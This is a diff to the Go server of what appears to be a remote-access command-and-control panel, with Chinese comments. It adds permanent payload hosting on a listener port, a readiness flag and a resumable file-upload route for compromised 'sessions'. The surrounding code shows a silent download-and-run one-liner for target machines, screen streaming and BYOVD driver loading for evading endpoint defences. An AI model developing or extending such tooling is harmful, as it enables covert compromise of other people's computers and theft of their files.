@@ -8,6 +8,7 @@ import (
 	"net/http"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"github.com/gorilla/mux"
@@ -126,6 +127,10 @@ type BuildResponse struct {
 	SHA256      string `json:"sha256"`
 	BuildTime   string `json:"build_time"`
 	DownloadURL string `json:"download_url"`
+	// HostedURL 载荷托管地址（v1.4.3 #15b-B）：走**监听器端口**的
+	// `/<prefix>/<token>/<文件名>`，不带 `/api/v1`、不暴露面板端口，永久可重复下载。
+	// 为空表示未启用托管（见 listener.payload_host_enabled），此时用 DownloadURL。
+	HostedURL string `json:"hosted_url,omitempty"`
 	// OneLiner 一条命令上线：直接复制到目标机执行即可静默下载并运行载荷（仅 exe/raw 生效）
 	OneLiner string `json:"one_liner"`
 	// OneLinerHost 实际解析出的载荷下载主机（host[:port]），供 UI 明确展示
@@ -203,6 +208,10 @@ type Server struct {
 	// 屏幕流帧限速/合并状态（见 screen_frame_limiter.go，P0.2）
 	screenLimiter     *screenFrameLimiter
 	screenLimiterOnce sync.Once
+
+	// payloadHostReady HTTP 监听器是否真的在跑（v1.4.3 #15b-B）。
+	// 监听器端口 TCP/HTTP 互斥：只有 HTTP 起来了，托管下载地址才有人应答。
+	payloadHostReady atomic.Bool
 
 	// 本会话已加载的 BYOVD 驱动档案（服务端不再内置驱动，见 handlers_edr.go）
 	driverMu       sync.Mutex
@@ -542,6 +551,8 @@ func (s *Server) setupRoutes() {
 	api.HandleFunc("/sessions/{id}/files", s.listFilesHandler).Methods("GET", "POST")
 	api.HandleFunc("/sessions/{id}/files/download", s.downloadFileHandler).Methods("POST")
 	api.HandleFunc("/sessions/{id}/files/upload", s.uploadFileHandler).Methods("POST")
+	// v1.4.3 #15a-B：断点续传——先问已收到多少字节，再从断点继续。
+	api.HandleFunc("/sessions/{id}/files/upload/{upload_id}", s.uploadStatusHandler).Methods("GET")
 	api.HandleFunc("/sessions/{id}/files/delete", s.deleteFileHandler).Methods("POST")
 	// 文件预览：规则清单 + 服务端二次校验（黑名单/未识别/超大/二进制）。
 	api.HandleFunc("/files/preview-policy", s.previewPolicyHandler).Methods("GET")
